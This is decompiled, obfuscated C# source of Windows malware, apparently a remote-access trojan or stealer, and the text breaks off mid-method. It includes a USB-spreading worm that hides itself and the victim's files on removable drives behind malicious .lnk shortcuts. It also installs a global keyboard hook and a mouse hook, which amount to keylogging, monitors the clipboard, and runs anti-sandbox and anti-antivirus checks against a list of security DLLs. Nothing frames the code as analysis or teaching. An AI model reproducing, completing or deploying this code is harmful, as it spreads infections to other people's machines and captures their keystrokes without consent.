using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class N
{
	public struct C
	{
		[MarshalAs(UnmanagedType.U4)]
		public int cbSize;

		[MarshalAs(UnmanagedType.U4)]
		public int dwTime;
	}

	public enum M
	{
		OperatingSystemName,
		ProcessorName,
		AmountOfMemory,
		VideocardName,
		VideocardMem
	}

	public class @_
	{
		private byte[] bPassword;

		private string sPassword;

		public string PasswordHash
		{
			get
			{
				UTF8Encoding uTF8Encoding = new UTF8Encoding();
				return uTF8Encoding.GetString(bPassword);
			}
		}

		public string Password
		{
			get
			{
				UTF8Encoding uTF8Encoding = new UTF8Encoding();
				return sPassword;
			}
			set
			{
				UTF8Encoding uTF8Encoding = new UTF8Encoding();
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				bPassword = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes(value));
				sPassword = value;
			}
		}

		public _(string Password = "password")
		{
			this.Password = Password;
		}

		public string Encrypt(string Message)
		{
			//Discarded unreachable code: IL_0067
			byte[] inArray = null;
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				byte[] key = bPassword;
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = uTF8Encoding.GetBytes(Message);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					mD5CryptoServiceProvider.Clear();
				}
			}
			return Convert.ToBase64String(inArray);
		}

		private string Encrypt(string Message, byte[] Password)
		{
			//Discarded unreachable code: IL_0074
			byte[] inArray = null;
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes(uTF8Encoding.GetString(Password)));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = uTF8Encoding.GetBytes(Message);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					mD5CryptoServiceProvider.Clear();
				}
			}
			return Convert.ToBase64String(inArray);
		}

		public string Encrypt(string Message, string Password)
		{
			//Discarded unreachable code: IL_006e
			byte[] inArray = null;
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes(Password));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = uTF8Encoding.GetBytes(Message);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					mD5CryptoServiceProvider.Clear();
				}
			}
			return Convert.ToBase64String(inArray);
		}

		public string Decrypt(string Message)
		{
			//Discarded unreachable code: IL_0066
			byte[] bytes = null;
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				byte[] key = bPassword;
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(Message);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					mD5CryptoServiceProvider.Clear();
				}
			}
			return uTF8Encoding.GetString(bytes);
		}

		public string Decrypt(string Message, byte[] Password)
		{
			//Discarded unreachable code: IL_0073
			byte[] bytes = null;
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes(uTF8Encoding.GetString(Password)));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(Message);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					mD5CryptoServiceProvider.Clear();
				}
			}
			return uTF8Encoding.GetString(bytes);
		}

		public string Decrypt(string Message, string Password)
		{
			//Discarded unreachable code: IL_006d
			byte[] bytes = null;
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes(Password));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(Message);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					mD5CryptoServiceProvider.Clear();
				}
			}
			return uTF8Encoding.GetString(bytes);
		}
	}

	public class OZ
	{
		private bool Off;

		private Thread thread;

		public string ExeName;

		public OZ()
		{
			Off = false;
			thread = null;
			ExeName = "scr.exe";
		}

		public void Start()
		{
			if (thread == null)
			{
				thread = new Thread(usb, 1);
				thread.Start();
			}
		}

		public void clean()
		{
			Off = true;
			while (thread != null)
			{
				Thread.Sleep(1);
			}
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					if (!driveInfo.IsReady || !((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
					{
						continue;
					}
					if (File.Exists(driveInfo.Name + ExeName))
					{
						File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Normal);
						File.Delete(driveInfo.Name + ExeName);
					}
					string[] files = Directory.GetFiles(driveInfo.Name);
					foreach (string text in files)
					{
						try
						{
							File.SetAttributes(text, FileAttributes.Normal);
							if (text.ToLower().EndsWith(".lnk"))
							{
								File.Delete(text);
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							ProjectData.ClearProjectError();
						}
					}
					string[] directories = Directory.GetDirectories(driveInfo.Name);
					foreach (string path in directories)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							directoryInfo.Attributes = FileAttributes.Normal;
							directoryInfo = null;
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					ProjectData.ClearProjectError();
				}
			}
		}

		public void usb()
		{
			Off = false;
			while (!Off)
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					try
					{
						if (!driveInfo.IsReady || !(((driveInfo.TotalFreeSpace > 0) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
						{
							continue;
						}
						try
						{
							if (File.Exists(driveInfo.Name + ExeName))
							{
								File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Normal);
							}
							File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.Name + ExeName, true);
							File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Hidden);
							string[] files = Directory.GetFiles(driveInfo.Name);
							foreach (string text in files)
							{
								if ((Operators.CompareString(Path.GetExtension(text).ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + ExeName.ToLower(), false) != 0))
								{
									File.SetAttributes(text, FileAttributes.Hidden);
									File.Delete(driveInfo.Name + new FileInfo(text).Name + ".lnk");
									object instance = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), null, "CreateShortcut", new object[1]
									{
										driveInfo.Name + new FileInfo(text).Name + ".lnk"
									}, null, null, null);
									NewLateBinding.LateSetComplex(instance, null, "TargetPath", new object[1]
									{
										"cmd.exe"
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance, null, "WorkingDirectory", new object[1]
									{
										""
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance, null, "Arguments", new object[1]
									{
										"/c start " + ExeName.Replace( "", "\" \"") + "&start " + new FileInfo(text).Name.Replace(" " , "\" \"") + " & exit"
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance, null, "IconLocation", new object[1]
									{
										GetIcon(Path.GetExtension(text))
									}, null, null, false, true);
									NewLateBinding.LateCall(instance, null, "Save", new object[0], null, null, null, true);
									instance = null;
								}
							}
							string[] directories = Directory.GetDirectories(driveInfo.Name);
							foreach (string path in directories)
							{
								File.SetAttributes(path, FileAttributes.Hidden);
								File.Delete(driveInfo.Name + new DirectoryInfo(path).Name + " .lnk");
								object instance2 = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), null, "CreateShortcut", new object[1]
								{
									driveInfo.Name + Path.GetFileNameWithoutExtension(path) + " .lnk"
								}, null, null, null);
								NewLateBinding.LateSetComplex(instance2, null, "TargetPath", new object[1]
								{
									"cmd.exe"
								}, null, null, false, true);
								NewLateBinding.LateSetComplex(instance2, null, "WorkingDirectory", new object[1]
								{
									""
								}, null, null, false, true);
								NewLateBinding.LateSetComplex(instance2, null, "Arguments", new object[1]
								{
									"/c start " + ExeName.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(path).Name + "\" & exit"
								}, null, null, false, true);
								NewLateBinding.LateSetComplex(instance2, null, "IconLocation", new object[1]
								{
									@"%SystemRoot%\system32\SHELL32.dll,3"
								}, null, null, false, true);
								NewLateBinding.LateCall(instance2, null, "Save", new object[0], null, null, null, true);
								instance2 = null;
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.ClearProjectError();
					}
				}
				Thread.Sleep(5000);
			}
			thread = null;
		}

		public string GetIcon(string ext)
		{
			try
			{
				object instance = Registry.LocalMachine.OpenSubKey(@"Software\Classes\", false);
				string memberName = "OpenSubKey";
				object[] array = new object[1];
				string memberName2 = "OpenSubKey";
				object[] array2 = new object[2]
				{
					ext,
					false
				};
				bool[] array3 = new bool[2]
				{
					true,
					false
				};
				object instance2 = NewLateBinding.LateGet(instance, null, memberName2, array2, null, null, array3);
				if (array3[0])
				{
					ext = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				array[0] = Operators.ConcatenateObject(NewLateBinding.LateGet(instance2, null, "GetValue", new object[1]
				{
					""
				}, null, null, null), @"\DefaultIcon\");
				string text = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, memberName, array, null, null, null), null, "GetValue", new object[2]
				{
					"",
					""
				}, null, null, null));
				if (!text.Contains(","))
				{
					text += ",0";
				}
				return text;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public class PB
	{
		private delegate int HP(int code, int flags, ref MouseData data);

		private struct MouseData
		{
			public Point Point;

			public int Code;

			public int Flags;

			public int Time;

			public int Info;
		}

		public delegate void UpEventHandler(object sender, ref MouseEvent e);

		public delegate void DownEventHandler(object sender, ref MouseEvent e);

		public delegate void ClickEventHandler(object sender, ref MouseEvent e);

		public delegate void DoubleClickEventHandler(object sender, ref MouseEvent e);

		public delegate void WheelEventHandler(object sender, ref MouseEvent e);

		public delegate void MoveEventHandler(object sender, ref MouseEvent e);

		[EditorBrowsable(EditorBrowsableState.Never)]
		public struct MouseEvent
		{
			public readonly MouseButtons Button;

			public readonly int Clicks;

			public readonly int Delta;

			public readonly Point Location;

			private bool _Handled;

			public bool Handled
			{
				get
				{
					return _Handled;
				}
				set
				{
					_Handled = value;
				}
			}

			public MouseEvent(MouseButtons _button, int _clicks, int _delta, Point _location)
			{
				this = default(MouseEvent);
				Button = _button;
				Clicks = _clicks;
				Delta = _delta;
				Location = _location;
			}
		}

		private UpEventHandler UN_8;

		private DownEventHandler UF_9;

		private ClickEventHandler JS_10;

		private DoubleClickEventHandler B__11;

		private WheelEventHandler SD_12;

		private MoveEventHandler RA_13;

		private int YK_14;

		private Point CNE_15;

		private HP FG_16;

		public event UpEventHandler X__17
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				UN_8 = (UpEventHandler)Delegate.Combine(UN_8, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				UN_8 = (UpEventHandler)Delegate.Remove(UN_8, value);
			}
		}

		public event DownEventHandler _G_18
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				UF_9 = (DownEventHandler)Delegate.Combine(UF_9, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				UF_9 = (DownEventHandler)Delegate.Remove(UF_9, value);
			}
		}

		public event ClickEventHandler RE_19
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				JS_10 = (ClickEventHandler)Delegate.Combine(JS_10, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				JS_10 = (ClickEventHandler)Delegate.Remove(JS_10, value);
			}
		}

		public event DoubleClickEventHandler NK_20
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				B__11 = (DoubleClickEventHandler)Delegate.Combine(B__11, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				B__11 = (DoubleClickEventHandler)Delegate.Remove(B__11, value);
			}
		}

		public event WheelEventHandler LY_21
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				SD_12 = (WheelEventHandler)Delegate.Combine(SD_12, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				SD_12 = (WheelEventHandler)Delegate.Remove(SD_12, value);
			}
		}

		public event MoveEventHandler LZ_22
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				RA_13 = (MoveEventHandler)Delegate.Combine(RA_13, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				RA_13 = (MoveEventHandler)Delegate.Remove(RA_13, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Auto, EntryPoint = "UnhookWindowsHookEx", SetLastError = true)]
		private static extern int _N(int GC_1);

		[DllImport("user32", CharSet = CharSet.Auto, EntryPoint = "SetWindowsHookExA", SetLastError = true)]
		private static extern int KM(int T_2, Delegate GE_3, IntPtr V__4, int DV_5);

		[DllImport("user32", CharSet = CharSet.Auto, EntryPoint = "CallNextHookEx", SetLastError = true)]
		private static extern int V(IntPtr AM_6, int J_7, int XD_8, object OQ_9);

		public void G_()
		{
			FG_16 = R;
			YK_14 = KM(14, FG_16, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
		}

		public int FX()
		{
			return _N(YK_14);
		}

		private int R(int LT_22, int Y__23, ref MouseData P_24)
		{
			if (LT_22 == 0)
			{
				bool flag2 = default(bool);
				MouseButtons button = default(MouseButtons);
				int num2 = default(int);
				bool flag = default(bool);
				int num = default(int);
				switch (Y__23)
				{
				case 513:
					flag2 = true;
					button = MouseButtons.Left;
					num2 = 1;
					break;
				case 514:
					flag = true;
					button = MouseButtons.Left;
					num2 = 1;
					break;
				case 515:
					button = MouseButtons.Left;
					num2 = 2;
					break;
				case 516:
					flag2 = true;
					button = MouseButtons.Right;
					num2 = 1;
					break;
				case 517:
					flag = true;
					button = MouseButtons.Right;
					num2 = 1;
					break;
				case 518:
					button = MouseButtons.Right;
					num2 = 2;
					break;
				case 519:
					flag2 = true;
					button = MouseButtons.Middle;
					num2 = 1;
					break;
				case 520:
					flag = true;
					button = MouseButtons.Middle;
					num2 = 1;
					break;
				case 521:
					button = MouseButtons.Middle;
					num2 = 2;
					break;
				case 522:
					num = P_24.Code >> 16;
					break;
				}
				MouseEvent e = new MouseEvent(button, num2, num, P_24.Point);
				if (flag)
				{
					UpEventHandler uN_ = UN_8;
					if (uN_ != null)
					{
						uN_(this, ref e);
					}
				}
				if (flag2)
				{
					DownEventHandler uF_ = UF_9;
					if (uF_ != null)
					{
						uF_(this, ref e);
					}
				}
				if (num2 > 0)
				{
					ClickEventHandler jS_ = JS_10;
					if (jS_ != null)
					{
						jS_(this, ref e);
					}
				}
				if (num2 == 2)
				{
					DoubleClickEventHandler b__ = B__11;
					if (b__ != null)
					{
						b__(this, ref e);
					}
				}
				if (P_24.Point != CNE_15)
				{
					CNE_15 = P_24.Point;
					MoveEventHandler rA_ = RA_13;
					if (rA_ != null)
					{
						rA_(this, ref e);
					}
				}
				if (num != 0)
				{
					WheelEventHandler sD_ = SD_12;
					if (sD_ != null)
					{
						sD_(this, ref e);
					}
				}
				if (e.Handled)
				{
					return -1;
				}
			}
			int result = default(int);
			return result;
		}
	}

	public class Clipboard : NativeWindow
	{
		public delegate void ChangedEventHandler(Clipboard sender);

		private ChangedEventHandler ChangedEvent;

		private IntPtr ID;

		public event ChangedEventHandler Changed
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				ChangedEvent = (ChangedEventHandler)Delegate.Combine(ChangedEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				ChangedEvent = (ChangedEventHandler)Delegate.Remove(ChangedEvent, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetClipboardViewer(IntPtr handle);

		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool ChangeClipboardChain(IntPtr handle, IntPtr next);

		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern long SendMessage(IntPtr handle, int code, IntPtr flags, IntPtr data);

		public Clipboard()
		{
			CreateHandle(new CreateParams());
		}

		public void Install()
		{
			ID = SetClipboardViewer(Handle);
		}

		public void Uninstall()
		{
			ChangeClipboardChain(Handle, ID);
		}

		protected override void WndProc(ref Message m)
		{
			switch (m.Msg)
			{
			case 776:
			{
				ChangedEventHandler changedEvent = ChangedEvent;
				if (changedEvent != null)
				{
					changedEvent(this);
				}
				SendMessage(ID, m.Msg, m.WParam, m.LParam);
				break;
			}
			case 781:
				if (m.WParam == ID)
				{
					ID = m.LParam;
				}
				else
				{
					SendMessage(ID, m.Msg, m.WParam, m.LParam);
				}
				break;
			}
			base.WndProc(ref m);
		}

		//protected override void Finalize()
		~Clipboard()
		{
			Uninstall();
		}
	}

	public class PC
	{
		private struct KBDLLHOOKSTRUCT
		{
			public uint vkCode;

			public uint scanCode;

			public KBDLLHOOKSTRUCTFlags flags;

			public uint time;

			public UIntPtr dwExtraInfo;
		}

		[Flags]
		private enum KBDLLHOOKSTRUCTFlags : uint
		{
			LLKHF_EXTENDED = 0x1u,
			LLKHF_INJECTED = 0x10u,
			LLKHF_ALTDOWN = 0x20u,
			LLKHF_UP = 0x80u
		}

		public delegate void KeyDownEventHandler(Keys Key);

		public delegate void KeyUpEventHandler(Keys Key);

		private delegate int KBDLLHookProc(int nCode, IntPtr wParam, IntPtr lParam);

		private static KeyDownEventHandler QB_23;

		private static KeyUpEventHandler UH_24;

		private const int AT_25 = 13;

		private const int ST_26 = 0;

		private const int OI_27 = 256;

		private const int RM_28 = 257;

		private const int WP_29 = 260;

		private const int EO_30 = 261;

		private KBDLLHookProc OP_31;

		private IntPtr PI_32;

		public static event KeyDownEventHandler KA_33
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				QB_23 = (KeyDownEventHandler)Delegate.Combine(QB_23, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				QB_23 = (KeyDownEventHandler)Delegate.Remove(QB_23, value);
			}
		}

		public static event KeyUpEventHandler HQ_34
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				UH_24 = (KeyUpEventHandler)Delegate.Combine(UH_24, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				UH_24 = (KeyUpEventHandler)Delegate.Remove(UH_24, value);
			}
		}

		public PC()
		{
			OP_31 = HD;
			PI_32 = IntPtr.Zero;
		}

		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, EntryPoint = "SetWindowsHookEx")]
		private static extern int FFO(int CG_25, KBDLLHookProc HE_26, IntPtr SE_27, int KT_28);

		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, EntryPoint = "CallNextHookEx")]
		private static extern int FA(int ADV_29, int XC_30, IntPtr NR_31, IntPtr OA_32);

		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, EntryPoint = "UnhookWindowsHookEx")]
		private static extern bool XV(int LO_33);

		private int HD(int D_38, IntPtr NY_39, IntPtr VM_40)
		{
			if (D_38 == 0)
			{
				KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = default(KBDLLHOOKSTRUCT);
				KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT2 = default(KBDLLHOOKSTRUCT);
				if (NY_39 == (IntPtr)256 || NY_39 == (IntPtr)260)
				{
					KeyDownEventHandler qB_ = QB_23;
					if (qB_ != null)
					{
						object obj = Marshal.PtrToStructure(VM_40, kBDLLHOOKSTRUCT.GetType());
						qB_((Keys)checked((int)((obj != null) ? ((KBDLLHOOKSTRUCT)obj) : kBDLLHOOKSTRUCT2).vkCode));
					}
				}
				else if (NY_39 == (IntPtr)257 || NY_39 == (IntPtr)261)
				{
					KeyUpEventHandler uH_ = UH_24;
					if (uH_ != null)
					{
						object obj2 = Marshal.PtrToStructure(VM_40, kBDLLHOOKSTRUCT.GetType());
						uH_((Keys)checked((int)((obj2 != null) ? ((KBDLLHOOKSTRUCT)obj2) : kBDLLHOOKSTRUCT2).vkCode));
					}
				}
			}
			return FA((int)IntPtr.Zero, D_38, NY_39, VM_40);
		}

		public void _E()
		{
			try
			{
				int num = 0;
				do
				{
					PI_32 = (IntPtr)FFO(13, OP_31, (IntPtr)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
					if (PI_32 != IntPtr.Zero)
					{
						break;
					}
					num = checked(num + 1);
				}
				while (num <= 10);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		protected /*override*/ void BC()
		{
			if (!(PI_32 == IntPtr.Zero))
			{
				XV((int)PI_32);
			}
			//Finalize();
		}
	}

	public class ZA
	{
		public enum FreeType : uint
		{
			DECOMMIT = 0x4000u,
			RELEASE = 0x8000u
		}

		private struct PROCESSENTRY32
		{
			public uint dwSize;

			public uint cntUsage;

			public uint th32ProcessID;

			public IntPtr th32DefaultHeapID;

			public uint th32ModuleID;

			public uint cntThreads;

			public uint th32ParentProcessID;

			public int pcPriClassBase;

			public uint dwFlags;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
			public string szExeFile;
		}

		[Flags]
		public enum HANDLE_FLAGS : uint
		{
			None = 0x0u,
			INHERIT = 0x1u,
			PROTECT_FROM_CLOSE = 0x2u
		}

		private struct CONTEXT
		{
			public uint ContextFlags;

			public uint Dr0;

			public uint Dr1;

			public uint Dr2;

			public uint Dr3;

			public uint Dr6;

			public uint Dr7;

			public FLOATING_SAVE_AREA FloatSave;

			public uint SegGs;

			public uint SegFs;

			public uint SegEs;

			public uint SegDs;

			public uint Edi;

			public uint Esi;

			public uint Ebx;

			public uint Edx;

			public uint Ecx;

			public uint Eax;

			public uint Ebp;

			public uint Eip;

			public uint SegCs;

			public uint EFlags;

			public uint Esp;

			public uint SegSs;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] ExtendedRegisters;
		}

		private struct FLOATING_SAVE_AREA
		{
			public uint ControlWord;

			public uint StatusWord;

			public uint TagWord;

			public uint ErrorOffset;

			public uint ErrorSelector;

			public uint DataOffset;

			public uint DataSelector;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] RegisterArea;

			public uint Cr0NpxState;
		}

		private enum CONTEXT_FLAGS : uint
		{
			CONTEXT_i386 = 0x10000u,
			CONTEXT_i486 = 0x10000u,
			CONTEXT_CONTROL = 65537u,
			CONTEXT_INTEGER = 65538u,
			CONTEXT_SEGMENTS = 65540u,
			CONTEXT_FLOATING_POINT = 65544u,
			CONTEXT_DEBUG_REGISTERS = 65552u,
			CONTEXT_EXTENDED_REGISTERS = 65568u,
			CONTEXT_FULL = 65543u,
			CONTEXT_ALL = 65599u
		}

		[StructLayout(LayoutKind.Explicit)]
		private struct SYSTEM_INFO_UNION
		{
			[FieldOffset(0)]
			public uint OemId;

			[FieldOffset(0)]
			public ushort ProcessorArchitecture;

			[FieldOffset(2)]
			public ushort Reserved;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		private struct SYSTEM_INFO
		{
			public SYSTEM_INFO_UNION CpuInfo;

			public uint PageSize;

			public uint MinimumApplicationAddress;

			public uint MaximumApplicationAddress;

			public uint ActiveProcessorMask;

			public uint NumberOfProcessors;

			public uint ProcessorType;

			public uint AllocationGranularity;

			public ushort ProcessorLevel;

			public ushort ProcessorRevision;
		}

		private enum Protection
		{
			PAGE_NOACCESS = 1,
			PAGE_READONLY = 2,
			PAGE_READWRITE = 4,
			PAGE_WRITECOPY = 8,
			PAGE_EXECUTE = 0x10,
			PAGE_EXECUTE_READ = 0x20,
			PAGE_EXECUTE_READWRITE = 0x40,
			PAGE_EXECUTE_WRITECOPY = 0x80,
			PAGE_GUARD = 0x100,
			PAGE_NOCACHE = 0x200,
			PAGE_WRITECOMBINE = 0x400
		}

		private uint MY_35;

		public ZA()
		{
			MY_35 = 2u;
		}

		public void FC()
		{
			bool flag = false;
			if (CF())
			{
				YV();
			}
			if (NQG())
			{
				YV();
			}
			if (LM())
			{
				YV();
			}
			if (K())
			{
				YV();
			}
			if (HT())
			{
				YV();
			}
			if (GS())
			{
				YV();
			}
			if (SM())
			{
				YV();
			}
			if (Operators.ConditionalCompareObjectEqual(EGU(), true, false))
			{
				YV();
			}
			if (HI())
			{
				YV();
			}
			if (L_())
			{
				YV();
			}
			if (QJU())
			{
				YV();
			}
			if (UR())
			{
				YV();
			}
			if (GN())
			{
				YV();
			}
			if (flag && EEJ())
			{
				YV();
			}
		}

		private void YV()
		{
			Application.Exit();
		}

		private bool EEJ()
		{
			//Discarded unreachable code: IL_01a0, IL_01b1
			string[] array = new string[12]
			{
				"avghookx.dll",
				"avghooka.dll",
				"snxhk.dll",
				"dbghelp.dll",
				"api_log.dll",
				"dir_watch.dll",
				"pstorec.dll",
				"vmcheck.dll",
				"wpespy.dll",
				"Sf2.dll",
				"cmdvrt32.dll",
				"SxIn.dll"
			};
			object obj = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, null, "Get", new object[0], null, null, null));
				try
				{
					IEnumerator enumerator = default(IEnumerator);
					try
					{
